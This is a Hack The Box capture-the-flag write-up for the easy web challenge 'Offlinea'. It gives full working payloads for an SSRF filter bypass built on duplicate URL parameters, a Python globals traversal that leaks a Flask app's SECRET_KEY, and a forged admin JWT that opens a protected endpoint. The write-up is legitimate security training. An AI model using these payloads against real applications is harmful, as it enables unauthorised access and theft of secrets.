<h1 style="color:blue;">Offlinea challenge</h1>

  Platform: Hack The Box
  
  Author: 0xL0m4
  
  Category: Web (Easy)

<img width="1609" height="161" alt="image" src="https://github.com/user-attachments/assets/0fbe1d11-734c-4b45-86ff-59e25c8a01cf" />

## Challenge Description: 
    
In a world without internet, information has a new price. One secret. One look. What are you willing to trade?

## Tools Used

  - VS code
  - Burp Suite
  - JWT generator (https://www.jwt.io/)
  
## Steps:

### 1. Download the source code and open the website
After downloading and reviewing the source code, I noticed that the web takes url, name, and secret's user.

The backend validates the URL (it must begin with http/s) and there is also a restriction that blocks private IP ranges.

<img width="1452" height="752" alt="image" src="https://github.com/user-attachments/assets/0affb4a9-a85f-49bc-b192-516ad2a95b83" />


### 2. Testing the Application
I started by submitting a normal request (url begin with http e.g. http://example.com). Then, intercept the request.

However, the result always redirected me to no_way.pdf.

This indicated that the request must successfully pass internal validation and execution.


### 3. Understanding the logic flow
After analyzing the PHP code, I noticed this critical line:

```
$final_url = $api_scraper.$_SERVER['QUERY_STRING']."&time=".$t;
```
This means the application forwards the raw query string (all parameters behind ?) and execute them. This includes duplicate parameters and raw input.

<img width="1455" height="517" alt="image" src="https://github.com/user-attachments/assets/6cc4de51-c6dc-4ac0-af4c-87ec768375c6" />


### 4. Identifying the core issue
The application uses $_GET['url'] for validation, which returns only the last occurrence of a duplicate parameter.

However, the backend forwards $_SERVER['QUERY_STRING'] which contains all parameters in raw form.

So I try: ?url=A&url=B

Even though it keeps only the last value for validation, the full query string is still forwarded.

### 5. Start injecting the payload.
But before discussing the payload , I found logs and bartender endpoints. Bartender endpoint is protected by JWT.

The payload: /bartender.php?url=http://127.0.0.1:5000/logs&url=http://example.com&secret=km&name=ij

<img width="1250" height="777" alt="image" src="https://github.com/user-attachments/assets/20dfdf2f-8c49-46eb-bb94-dbd5cdab0bcf" />


First I request the internal endpoint logs --> url=http://127.0.0.1:5000/logs

Then, I put all its needs such as url and name.

The result : It redirects me to result-t.pdf and it is empty.

At this stage, the main goal was to find a way to retrieve the secret key used for signing tokens.

### 6. Secret key exposure 
I want to reach the token to access the bartender endpoint.

I searched where it was stored. I found it was stored in app.config['SECRET_KEY'].

<img width="1920" height="276" alt="image" src="https://github.com/user-attachments/assets/7e002fd9-2f48-4fac-bb86-cb3c1ec0688d" />

So, we can use existing function called logify as a bridge to reach it.
The payload : 
```
/bartender.php?url=http://127.0.0.1:5000/logs?secret={logify.__globals__[app].config[SECRET_KEY]}&url=http://example.com&secret=k&name=l
```
\_\_globals__[app].config[SECRET_KEY] = app.config['SECRET_KEY']

The secret key was successfully retreived.

<img width="1262" height="774" alt="image" src="https://github.com/user-attachments/assets/089fd343-a913-4fd1-b99a-679515ab8f2a" />

<img width="1920" height="306" alt="image" src="https://github.com/user-attachments/assets/995e2e0a-8ef9-4444-b63d-9681b12c487b" />



### 5. Access bartender endpoint

When diving into the code , you can notice that if you want to access bartender endpoint , you need to the token.

The token is Jwt and signed with the secret key that we reached.


### 6. Generate the JWT token
After obtaining the secret key, I generated a JWT token.
The application logic shows:

```
if not data.get('is_admin') and data.get('username') == 'bartender':
    return 403
```

So to bypass it, I created a token :

```
{
  "username": "salma",
  "is_admin": true
}
```
And, don't forget to put your sign in Sign JWT

<img width="1252" height="632" alt="image" src="https://github.com/user-attachments/assets/90dc1850-1975-4f20-81c9-36a2ae20fab8" />


### 7. Get the flag
Using the generated token:
```
?url=http://127.0.0.1:5000/bartender?token=JWT_TOKEN&url=http://example.com&secret=k&name=l
```
<img width="1262" height="733" alt="image" src="https://github.com/user-attachments/assets/a13035d3-f711-4edb-bb7f-a61419f262ed" />


I was able to access the protected endpoint and show the flag.

<img width="1920" height="738" alt="image" src="https://github.com/user-attachments/assets/72caf035-36c2-49a8-9ecf-dce1f409245d" />


### The flag: 

 HTB{your_unique_flag}
     
[The challenge link](https://app.hackthebox.com/challenges/Offlinea?tab=play_challenge)

See you in the next writeup!
 
سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
